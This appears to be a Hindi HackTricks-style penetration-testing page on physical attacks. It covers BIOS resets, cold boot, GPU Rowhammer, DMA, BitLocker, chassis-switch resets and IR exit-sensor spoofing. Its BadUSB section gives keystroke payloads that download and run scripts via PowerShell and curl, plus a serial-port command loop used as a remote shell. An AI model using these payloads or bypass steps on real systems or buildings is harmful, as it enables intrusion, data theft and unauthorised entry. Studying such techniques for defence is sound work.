# भौतिक हमले

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery और System Security

Legacy PC firmware settings को CMOS battery disconnect करके या documented clear-CMOS jumper का उपयोग करके reset किया जा सकता है। आवश्यक power-off समय board-specific होता है, और modern UEFI passwords या keys nonvolatile flash, embedded controller या security device में मौजूद हो सकते हैं; इसलिए वे battery removal के बाद भी सुरक्षित रह सकते हैं। Pins को short करने से पहले board/service manual देखें; यह procedure TPM measurements को भी invalid कर सकता है और disk-encryption recovery trigger कर सकता है।

Legacy x86 systems पर **killCMOS** और **CmosPwd** जैसे tools bootable environment से CMOS-backed settings को inspect या alter कर सकते हैं। CmosPwd पुराने BIOS families के documented set से password formats को recognize करता है और CMOS state का backup, restore या erase/kill कर सकता है; इसके published builds legacy DOS/Windows, Linux, FreeBSD और NetBSD environments को target करते हैं।<sup>[[18]](#references)</sup> ये utilities generic UEFI password removers नहीं हैं और इनके लिए पर्याप्त hardware/firmware access आवश्यक है।

कुछ laptop firmware कई failed password attempts के बाद vendor-specific challenge code display करते हैं। [bios-pw.org](https://bios-pw.org) जैसे databases कुछ models के लिए legacy vendor recovery passwords derive कर सकते हैं, लेकिन कई systems ऐसा lockout implement करते हैं जिसमें कोई derivable challenge नहीं होता। किसी भी generated password को model-specific मानें और permanent attempt counters को समाप्त करने से बचें।

### UEFI Security

Modern **UEFI** systems के लिए, CHIPSEC Secure Boot variable protections का audit कर सकता है। नीचे दिए गए non-modifying check से शुरू करें; optional `-a modify` mode जानबूझकर variables को corrupt करने का प्रयास करता है और इसका उपयोग केवल ऐसे recoverable lab system पर किया जाना चाहिए जिसे restore किया जा सके। CHIPSEC स्वयं चेतावनी देता है कि इसका privileged driver और low-level hardware access production endpoints के लिए unsuitable हैं।<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM Analysis और Cold Boot Attacks

DRAM में refresh रुकते ही हर bit तुरंत समाप्त नहीं होती। Decay rate module technology और temperature के अनुसार काफी बदलती है; cooling, uncooled power cycle की तुलना में उपयोगी data को कहीं अधिक समय तक सुरक्षित रख सकती है। Cold-boot attack में तेजी से reboot करके छोटे acquisition environment में प्रवेश किया जाता है या cooled module को transfer किया जाता है, raw memory capture की जाती है, और bit decay के बावजूद cryptographic keys को reconstruct किया जाता है। Disk-copy utility अपने-आप physical-memory imager नहीं होती, और Volatility capture को acquire नहीं करता बल्कि उसका analysis करता है; platform-appropriate, validated acquisition tool का उपयोग करें।<sup>[[12]](#references)</sup>

---

## Page Tables के विरुद्ध GPU Rowhammer

Modern GPU Rowhammer attacks तब अधिक उपयोगी हो जाते हैं जब वे ordinary buffers के बजाय **GPU virtual-memory metadata** को target करते हैं। **GDDR6 NVIDIA Ampere GPUs** पर हाल के work से पता चलता है कि unprivileged CUDA code चलाने वाला attacker GPU-specific hammering patterns बना सकता है, **memory massaging** का उपयोग करके paging structures को vulnerable rows में रख सकता है, और फिर **last-level page table** या intermediate **page directory** में bits flip कर सकता है। एक translation entry corrupt होने के बाद attacker **arbitrary GPU memory read/write** प्राप्त कर सकता है और फिर host compromise की ओर pivot कर सकता है।<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6 में **hammerable rows** को **profile** करें और refresh-aware / non-uniform hammering patterns बनाएं, जो in-DRAM mitigations को bypass कर सकें।
2. **GPU allocations को massage** करें ताकि driver page-translation structures को default protected pool में रखने के बजाय hammerable physical locations में रखे। व्यवहार में इसका अर्थ low-memory page-table region को exhaust करना और controlled strides के साथ large sparse UVM mappings को spray करना हो सकता है।
3. **Translation metadata** जैसे **PFN** या aperture-related bits को page-table / page-directory entry के भीतर flip करें, ताकि attacker-controlled virtual page page-table pages, arbitrary GPU memory, या host-visible system mappings पर resolve हो।
4. Forged mapping का पुनः उपयोग करके अतिरिक्त translation entries को rewrite करें और GPU contexts के बीच **arbitrary GPU memory read/write** तक escalate करें।

### Host Pivot और Mitigations

- **IOMMU disabled** होने पर forged system-aperture mappings GPU के सामने arbitrary **host physical memory** expose कर सकते हैं, जिससे GPU primitive full host compromise में बदल जाता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** last-level page-table entries को target करता है, जबकि **GeForge** दिखाता है कि page-directory level को corrupt करना आसान हो सकता है क्योंकि एक bit flip बड़े translation subtree को retarget कर सकता है। केवल एक paging layer को security-critical न मानें।<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** अभी भी महत्वपूर्ण है क्योंकि यह GDDRHammer/GeForge द्वारा उपयोग किए जाने वाले direct arbitrary-host-memory path को block करता है, लेकिन यह **complete mitigation** नहीं है। **GPUBreach** second-stage pivot दिखाता है, जिसमें attacker GPU-writable, driver-owned CPU buffers को corrupt करता है और फिर NVIDIA driver memory-safety bugs को trigger करके kernel write primitive तथा **root shell** प्राप्त करता है, यहां तक कि IOMMU enabled होने पर भी।<sup>[[3]](#references)</sup>
- Supported workstation/server GPUs पर **System-level ECC** एक practical hardening step है। ECC के बिना consumer GPUs कमजोर defense surface expose करते हैं।<sup>[[4]](#references)</sup>
- ये attacks केवल theoretical नहीं हैं: **GeForge** ने RTX 3060 पर **1,171** और RTX A6000 पर **202** bit flips report किए, जो working host-privilege-escalation chain बनाने के लिए पर्याप्त थे।<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

Offline UEFI IFR/NVRAM patching के लिए, जो pre-boot IOMMU enforcement को downgrade कर सकती है और Windows DMA chain enable कर सकती है, देखें:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** FireWire और शुरुआती Thunderbolt configurations जैसे interfaces पर **DMA-based memory acquisition and patching** प्रदर्शित करता है, जिसमें historical login-bypass signatures भी शामिल हैं। यह केवल “Windows 10 के विरुद्ध ineffective” नहीं है: exploitability interface, target build, IOMMU policy, lock state, तथा Windows Kernel DMA Protection के supported और enabled होने पर निर्भर करती है। Windows 10 version 1803 और बाद के versions ने compatible platforms पर Kernel DMA Protection introduce किया, जिससे attack surface में महत्वपूर्ण बदलाव आया।<sup>[[13]](#references)[[14]](#references)</sup>

---

## System Access के लिए Live CD/USB

Unencrypted या पहले से unlocked Windows volume पर offline environment **sethc.exe** या **Utilman.exe** जैसे accessibility binaries को **cmd.exe** से replace कर सकता है। इससे संबंधित logon-screen shortcut चलने पर SYSTEM command prompt प्राप्त होता है। **chntpw** जैसे tools local SAM account data को edit कर सकते हैं। ये methods locked BitLocker volume को bypass नहीं करते और DPAPI/EFS से protected credentials को damage कर सकते हैं; forensic copies और backups सुरक्षित रखें।

**Kon-Boot** supported Windows/macOS configurations के लिए commercial boot-time authentication-bypass tool है। Compatibility OS, firmware mode, Secure Boot और disk-encryption setup पर निर्भर करती है; यह BitLocker-locked volume को decrypt नहीं करता।<sup>[[10]](#references)</sup>

---

## Windows Security Features को संभालना

### Boot और Recovery Shortcuts

- **Delete/Supr**, F2, F10 या कोई अन्य vendor key firmware setup खोल सकती है।
- **F8** केवल उन configurations पर legacy Windows advanced boot options में प्रवेश करता है जहां वह path enabled रहता है; current recovery entry अलग हो सकती है।
- कुछ configurations में **Shift** दबाकर Windows automatic logon को suppress किया जा सकता है, हालांकि policy/registry settings इस behavior को disable कर सकती हैं।<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky** और Teensy boards जैसे devices trusted HID keyboards के रूप में enumerate होकर predefined keystrokes inject कर सकते हैं। Payload को शुरुआत में logged-on session के privileges और desktop access प्राप्त होते हैं; UAC prompts, screen locking, keyboard layout, timing और endpoint USB policy अभी भी इसे सीमित करते हैं।<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator या backup privileges से shadow copy बनाई जा सकती है या registry hives save किए जा सकते हैं, जिससे **SAM** और **SYSTEM** जैसी locked files acquire की जा सकती हैं। यह post-compromise collection technique है, privilege bypass नहीं, और इसे `diskshadow`/VSS तथा registry-hive export events के साथ correlate किया जाना चाहिए।

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind** जैसे ESP32-S3 based implants USB-A→USB-C या USB-C↔USB-C cables के भीतर छिपते हैं, केवल USB keyboard के रूप में enumerate होते हैं, और अपना C2 stack Wi-Fi पर expose करते हैं। Operator को केवल victim host से cable को power देना, password `123456789` के साथ `Evil Crow Cable Wind` नाम का hotspot बनाना, और embedded HTTP interface तक पहुंचने के लिए [http://cable-wind.local/](http://cable-wind.local/) (या उसका DHCP address) खोलना होता है।<sup>[[8]](#references)</sup>
- Browser UI में *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* और *Config* के tabs होते हैं। Stored payloads को OS के अनुसार tag किया जाता है, keyboard layouts को तुरंत switch किया जा सकता है, और VID/PID strings को ज्ञात peripherals की नकल करने के लिए बदला जा सकता है।
- C2 cable के भीतर होने के कारण phone payloads को stage कर सकता है, execution trigger कर सकता है और organization के network का उपयोग किए बिना Wi-Fi credentials manage कर सकता है—कम dwell-time वाली physical intrusions के लिए उपयोगी।

### OS-aware AutoExec payloads

- AutoExec rules एक या अधिक payloads को USB enumeration के तुरंत बाद fire करने के लिए bind करते हैं। Implant lightweight OS fingerprinting करता है और matching script चुनता है।
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) या `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Execution unattended होने के कारण, केवल charging cable बदलने से logged-on user context के अंतर्गत “plug-and-pwn” initial access प्राप्त किया जा सकता है।

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Stored payload console खोलता है और एक loop paste करता है, जो नए USB serial device पर आने वाली हर चीज को execute करता है। एक minimal Windows variant है:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** implant USB CDC channel को खुला रखता है, जबकि उसका ESP32-S3 operator को वापस TCP client (Python script, Android APK, या desktop executable) लॉन्च करता है। TCP session में टाइप किए गए किसी भी byte को ऊपर दिए गए serial loop में forward किया जाता है, जिससे air-gapped hosts पर भी remote command execution संभव हो जाता है। Output सीमित होता है, इसलिए operators आमतौर पर blind commands चलाते हैं (account creation, अतिरिक्त tooling को stage करना आदि)।

### HTTP OTA अपडेट सतह

- Documented Evil Crow Cable Wind interface `/update` पर unauthenticated firmware-update endpoint एक्सपोज़ करता है:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators engagement के बीच features को hot-swap कर सकते हैं (जैसे, Flash USB Army Knife firmware), cable खोले बिना, जिससे implant target host में plugged रहते हुए भी नई capabilities पर pivot कर सकता है।

## BitLocker Encryption को Bypass करना

किसी live या हाल ही में चल रहे system का authorized forensic acquisition, volume के unlocked होने के दौरान, BitLocker volume master key या संबंधित key material रख सकता है। Elcomsoft Forensic Disk Decryptor और Passware Kit Forensic जैसे commercial tools supported memory images, hibernation files या crash dumps में खोज कर सकते हैं, लेकिन सफलता की गारंटी नहीं है। Modern Windows crash dumps को भी encrypt करता है जब BitLocker enabled हो, और stored 48-digit recovery password in-memory volume key से अलग artifact होता है।<sup>[[12]](#references)[[16]](#references)</sup>

---

## Recovery Key जोड़ने के लिए Social Engineering

एक attacker जो किसी administrator को BitLocker-management commands चलाने के लिए राजी कर लेता है, recovery-password, external-key या अन्य protector जोड़कर उसे capture कर सकता है। Recovery password मनमाने zeros वाले string का नहीं हो सकता: BitLocker numerical recovery passwords का validated 48-digit format होता है। संबंधित authorized-administration syntax `manage-bde -protectors -add C: -recoverypassword` है; परिणामी protectors को `manage-bde -protectors -get C:` से list करें। Protector additions को monitor करें और सुनिश्चित करें कि नया recovery material केवल approved locations में escrow किया जाए।<sup>[[16]](#references)</sup>

---

## BIOS को Factory-Reset करने के लिए Chassis Intrusion / Maintenance Switches का Exploitation

कई modern laptops और small-form-factor desktops में **chassis-intrusion switch** शामिल होता है, जिसे Embedded Controller (EC) और BIOS/UEFI firmware monitor करते हैं। जबकि switch का primary purpose device खोले जाने पर alert देना है, vendors कभी-कभी एक **undocumented recovery shortcut** implement करते हैं, जो switch को एक specific pattern में toggle करने पर trigger होता है।<sup>[[5]](#references)[[6]](#references)</sup>

### Attack कैसे काम करता है

1. Switch EC के **GPIO interrupt** से wired होता है।
2. EC पर चल रहा firmware **presses के timing और number** को track करता है।
3. जब hard-coded pattern recognise होता है, EC एक *mainboard-reset* routine invoke करता है, जो system NVRAM/CMOS के **contents को erase** करता है।
4. अगली boot पर, प्रभावित models reset firmware state load करते हैं। Vendor और revision के आधार पर, cleared state में supervisor password, custom boot settings या enrolled Secure Boot keys शामिल हो सकती हैं; TPM state और disk-encryption effects का अलग से assessment करना आवश्यक है।

> Firmware reset external-boot options को restore कर सकता है, लेकिन यह storage को **decrypt नहीं** करता। BitLocker या कोई अन्य full-disk encryption system TPM/firmware changes के बाद recovery में जा सकता है और recovery key के बिना भी internal drive को सुरक्षित रख सकता है।<sup>[[16]](#references)</sup>

### Real-World Example – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) का recovery shortcut है:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
दसवें cycle के बाद EC एक flag सेट करता है, जो BIOS को अगले reboot पर NVRAM wipe करने का निर्देश देता है। पूरी प्रक्रिया में लगभग 40 सेकंड लगते हैं और इसके लिए **सिर्फ एक screwdriver** की आवश्यकता होती है।<sup>[[5]](#references)</sup>

### सामान्य Exploitation Procedure

1. Target को power-on करें या suspend-resume करें, ताकि EC running हो।
2. Intrusion/maintenance switch तक पहुंचने के लिए bottom cover हटाएं।
3. Vendor-specific toggle pattern को दोहराएं (documentation, forums देखें या EC firmware को reverse-engineer करें)।
4. Device को फिर से assemble करके reboot करें, फिर जांचें कि कौन-सी firmware settings और credentials वास्तव में बदली हैं।
5. यदि authorized हों और external boot उपलब्ध हो, तो एक controlled live image से boot करें। जब कोई internal volume legitimately unlocked हो (या वह कभी encrypted न रहा हो), तो live environment credentials और data प्राप्त कर सकता है या EFI System Partition का निरीक्षण कर सकता है। EFI implant install करने के लिए उस partition को modify करना persistent और अत्यधिक intrusive है, और Secure Boot, measured boot, firmware write protection तथा endpoint monitoring से सीमित रहता है। Encrypted storage अपनी key या recovery material के बिना inaccessible रहती है।

### Detection & Mitigation

* OS management console में chassis-intrusion events log करें और उन्हें unexpected BIOS resets के साथ correlate करें।
* Opening का पता लगाने के लिए screws/covers पर **tamper-evident seals** लगाएं।
* Devices को **physically controlled areas** में रखें; मानकर चलें कि physical access का अर्थ पूर्ण compromise है।
* जहां उपलब्ध हो, vendor के “maintenance switch reset” feature को disable करें या NVRAM resets के लिए अतिरिक्त cryptographic authorisation आवश्यक बनाएं।

---

## No-Touch Exit Sensors के विरुद्ध Covert IR Injection

### Sensor Characteristics
- Commodity “wave-to-exit” sensors एक near-IR LED emitter को TV-remote style receiver module के साथ pair करते हैं, जो सही carrier (लगभग 30 kHz) की कई pulses (~4–10) देखने के बाद ही logic high report करता है।<sup>[[7]](#references)</sup>
- एक plastic shroud emitter और receiver को एक-दूसरे की ओर सीधे देखने से रोकता है, इसलिए controller मानता है कि validated carrier पास के reflection से आया है और door strike खोलने वाला relay drive करता है।
- जब controller मान लेता है कि target मौजूद है, तो वह अक्सर outbound modulation envelope बदल देता है, लेकिन receiver filtered carrier से match करने वाले किसी भी burst को स्वीकार करता रहता है।

### Attack Workflow
1. **Emission profile capture करें** – controller pins के across एक logic analyser connect करके pre-detection और post-detection दोनों waveforms record करें, जो internal IR LED को drive करते हैं।
2. **केवल “post-detection” waveform replay करें** – stock emitter को हटाएं/अनदेखा करें और शुरुआत से ही पहले से triggered pattern के साथ external IR LED drive करें। चूंकि receiver केवल pulse count/frequency की परवाह करता है, वह spoofed carrier को genuine reflection समझकर relay line assert कर देता है।
3. **Transmission को gate करें** – carrier को tuned bursts में transmit करें (जैसे, कुछ tens of milliseconds on और लगभग उतनी ही अवधि off), ताकि receiver के AGC या interference-handling logic को saturate किए बिना minimum pulse count भेजा जा सके। Continuous emission sensor को जल्दी desensitise कर देती है और relay को fire होने से रोक देती है।

### Long-Range Reflective Injection
- Bench LED को high-power IR diode, MOSFET driver और focusing optics से replace करने पर लगभग 6 m दूरी से reliable triggering संभव हो जाती है।
- Attacker को receiver aperture के लिए line-of-sight की आवश्यकता नहीं होती; glass के पार दिखाई देने वाली interior walls, shelving या door frames पर beam aim करने से reflected energy receiver के लगभग 30° field of view में प्रवेश कर सकती है और close-range hand wave जैसी प्रतीत होती है।
- चूंकि receivers केवल weak reflections की अपेक्षा करते हैं, इसलिए अधिक शक्तिशाली external beam कई surfaces से bounce होकर भी detection threshold से ऊपर रह सकती है।

### Weaponised Attack Torch
- Driver को commercial flashlight के अंदर embed करने से tool plain sight में छिप जाता है। Visible LED को receiver के band से matched high-power IR LED से replace करें, लगभग 30 kHz bursts generate करने के लिए ATtiny412 (या समान MCU) जोड़ें, और LED current sink करने के लिए MOSFET का उपयोग करें।
- Telescopic zoom lens range/precision के लिए beam को संकीर्ण करता है, जबकि MCU control के अंतर्गत vibration motor visible light emit किए बिना modulation active होने की haptic confirmation देता है।
- कई stored modulation patterns (थोड़ी अलग carrier frequencies और envelopes) के बीच cycle करने से rebranded sensor families के across compatibility बढ़ती है, जिससे operator reflective surfaces पर sweep कर सकता है जब तक relay audible click न करे और door release न हो जाए।

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Modern GPUs से Cross-Component Rowhammer Attacks](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Fun and Profit के लिए GDDR Memory को Hammer करके GPU Page Tables Forge करना](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer का उपयोग करके GPUs पर Privilege Escalation Attacks](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. यहां press करके pwn करें”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Covert IR Torch के साथ IR No-Touch Exit Sensors को Bypass करना”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Evil Crow Cable Wind के साथ Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Chips के विरुद्ध Rowhammer Attack](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot official documentation and compatibility information](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Lest We Remember: Encryption Keys पर Cold Boot Attacks](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA के माध्यम से physical memory manipulation](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - holding Shift and automatic logon behavior](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
